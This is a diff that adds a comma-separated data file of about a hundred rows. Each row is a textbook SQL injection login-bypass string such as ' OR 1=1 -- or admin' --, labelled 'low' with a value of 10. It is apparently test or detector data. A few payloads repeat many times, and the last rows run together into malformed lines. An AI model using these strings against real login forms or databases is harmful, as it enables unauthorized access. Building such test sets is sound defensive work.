@@ -1,0 +1,101 @@
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 -- /* test */,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR 'a'='a,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR 1=1 --,low,10
+' OR TRUE --,low,10
+' OR TRUE --,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+admin' --,low,10
+1' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,101' OR '1'='1,low,10
+1' OR '1'='1,low,10
+' OR 1=1 --,low,101' OR '1'='1,low,10
+1' OR '1'='1,low,10
